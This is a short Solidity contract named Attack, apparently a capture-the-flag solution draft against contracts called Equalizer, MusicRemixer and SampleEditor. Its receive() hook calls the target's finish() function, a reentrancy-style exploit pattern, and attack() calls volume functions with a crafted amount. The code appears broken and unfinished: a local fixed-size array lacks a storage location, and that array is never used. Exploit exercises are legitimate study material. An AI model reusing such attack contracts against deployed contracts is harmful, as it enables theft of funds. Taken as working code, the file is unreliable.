pragma solidity 0.8.19;

import "./Equalizer.sol";
import "./MusicRemixer.sol";
import "./SampleEditor.sol";

contract Attack {
    
    Equalizer public E;
    SampleEditor public SE;
    MusicRemixer public MR;

    constructor(address se, address mr, address e) payable{
        E = Equalizer(e);
        SE = SampleEditor(se);
        MR = MusicRemixer(mr);
    }

    receive() payable external {
        E.finish();
    }

    function attack() external {
        uint[3] amt;
        amt[0] = 10**18 - 1651651651121;
        SE.increaseVolume();
        SE.decreaseVolume();
    }
}